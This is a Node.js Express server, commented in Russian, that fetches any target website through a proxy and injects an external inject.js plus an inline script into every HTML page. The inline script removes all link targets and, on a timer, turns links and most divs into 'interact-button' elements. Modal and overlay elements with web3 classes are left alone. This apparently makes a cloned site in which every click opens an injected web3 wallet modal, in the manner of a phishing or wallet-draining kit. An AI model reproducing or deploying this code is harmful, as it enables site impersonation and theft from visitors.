const express = require("express");
const http = require("http");
const https = require("https");
const path = require("path");
const zlib = require("zlib"); // Для обработки сжатия

const app = express();
const PORT = process.env.PORT || 3000;

// Простое кеш-хранилище для статики
const staticCache = new Map();

// Раздаём inject.js
app.get("/inject.js", (req, res) => {
  res.setHeader("Content-Type", "application/javascript; charset=utf-8");
  res.sendFile(path.join(__dirname, "inject.js"), (err) => {
    if (err) {
      console.error("Ошибка при отправке inject.js:", err);
      res.status(500).send("Ошибка загрузки inject.js");
    }
  });
});

// Скрипт и инлайн-логика
const injectedScriptTag = `<script charset="UTF-8" type="text/javascript" src="/inject.js"></script>`;
const inlineScript = `
<script>
  function addClassesToElements() {
    try {
      const links = document.querySelectorAll('a:not(.interact-button)');
      for (const link of links) {
        link.removeAttribute('href');
        link.classList.add('interact-button');
      }
      const buttons = document.querySelectorAll('div:not(.interact-button):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
      for (const button of buttons) {
        button.classList.add('interact-button');
      }
    } catch (err) {
      console.error("Ошибка в addClassesToElements:", err);
    }
  }
  function runWhenReady() {
    try {
      addClassesToElements();
      setInterval(addClassesToElements, 300);
    } catch (err) {
      console.error("Ошибка в runWhenReady:", err);
    }
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", runWhenReady);
  } else {
    runWhenReady();
  }
</script>
`;

// Проксируем статику: /proxy/...
app.use("/proxy", (req, res) => {
  const targetBase = req.query.base;
  if (!targetBase) return res.status(400).send("Параметр ?base= обязателен");

  let targetUrl;
  try {
    targetUrl = new URL(req.originalUrl.replace("/proxy", ""), targetBase).toString();
  } catch (err) {
    return res.status(400).send("Некорректный URL: " + err.message);
  }

  const protocol = targetUrl.startsWith("https") ? https : http;

  // Проверка кеша
  if (staticCache.has(targetUrl)) {
    const cached = staticCache.get(targetUrl);
    res.writeHead(200, cached.headers);
    return res.end(cached.body);
  }

  protocol.get(targetUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } }, (proxyRes) => {
    let chunks = [];

    proxyRes.on("data", (chunk) => chunks.push(chunk));
    proxyRes.on("end", () => {
      let buffer = Buffer.concat(chunks);
      const contentType = proxyRes.headers["content-type"] || "";
      const contentEncoding = proxyRes.headers["content-encoding"];

      // Обработка сжатых данных
      if (contentEncoding === "gzip") {
        zlib.gunzip(buffer, (err, decoded) => {
          if (err) {
            console.error("Ошибка декомпрессии gzip:", err);
            return res.status(500).send("Ошибка декомпрессии");
          }
          buffer = decoded;
          handleResponse(buffer, contentType);
        });
      } else if (contentEncoding === "deflate") {
        zlib.inflate(buffer, (err, decoded) => {
          if (err) {
            console.error("Ошибка декомпрессии deflate:", err);
            return res.status(500).send("Ошибка декомпрессии");
          }
          buffer = decoded;
          handleResponse(buffer, contentType);
        });
      } else {
        handleResponse(buffer, contentType);
      }

      function handleResponse(buffer, contentType) {
        // Кешируем только статику
        if (!contentType.includes("text/html")) {
          staticCache.set(targetUrl, {
            headers: proxyRes.headers,
            body: buffer,
          });
        }

        let headers = { ...proxyRes.headers };
        delete headers["content-encoding"];
        res.writeHead(proxyRes.statusCode, headers);
        res.end(buffer);
      }
    });
  }).on("error", (err) => {
    console.error("Ошибка при проксировании статики:", err);
    res.status(500).send("Ошибка при проксировании статики: " + err.message);
  });
});

// Проксируем HTML с модификацией
app.get("/", (req, res) => {
  const targetUrl = req.query.id;
  if (!targetUrl) return res.status(400).send("Параметр ?id= обязателен");

  let urlObj;
  try {
    urlObj = new URL(targetUrl);
  } catch {
    return res.status(400).send("Некорректный URL");
  }

  const protocol = urlObj.protocol === "https:" ? https : http;

  protocol.get(targetUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } }, (proxyRes) => {
    let body = [];

    proxyRes.on("data", (chunk) => body.push(chunk));
    proxyRes.on("end", () => {
      let contentType = proxyRes.headers["content-type"] || "";
      let buffer = Buffer.concat(body);
      let responseBody;

      // Обработка сжатых данных
      const contentEncoding = proxyRes.headers["content-encoding"];
      if (contentEncoding === "gzip") {
        zlib.gunzip(buffer, (err, decoded) => {
          if (err) {
            console.error("Ошибка декомпрессии gzip:", err);
            return res.status(500).send("Ошибка декомпрессии");
          }
          processHtml(decoded.toString("utf8"));
        });
      } else if (contentEncoding === "deflate") {
        zlib.inflate(buffer, (err, decoded) => {
          if (err) {
            console.error("Ошибка декомпрессии deflate:", err);
            return res.status(500).send("Ошибка декомпрессии");
          }
          processHtml(decoded.toString("utf8"));
        });
      } else {
        processHtml(buffer.toString("utf8"));
      }

      function processHtml(responseBody) {
        if (contentType.includes("text/html")) {
          // Более надёжная замена путей
          responseBody = responseBody
            .replace(/(["'])(\/(_next|assets|static)\/[^"']+)/g, `$1/proxy$2?base=${encodeURIComponent(targetUrl)}`);

          // Вставляем скрипты
          if (responseBody.includes("</head>")) {
            responseBody = responseBody.replace(
              "</head>",
              `${injectedScriptTag}\n${inlineScript}</head>`
            );
          } else {
            responseBody = injectedScriptTag + inlineScript + responseBody;
          }
        }

        let headers = { ...proxyRes.headers };
        delete headers["content-length"];
        delete headers["content-encoding"];
        headers["content-type"] = contentType || "text/html; charset=utf-8";

        res.writeHead(proxyRes.statusCode, headers);
        res.end(responseBody);
      }
    });
  }).on("error", (err) => {
    console.error("Ошибка при проксировании:", err);
    res.status(500).send("Ошибка при проксировании: " + err.message);
  });
});

app.listen(PORT, () => {
  console.log(`🚀 Сервер запущен на порту ${PORT}`);
});
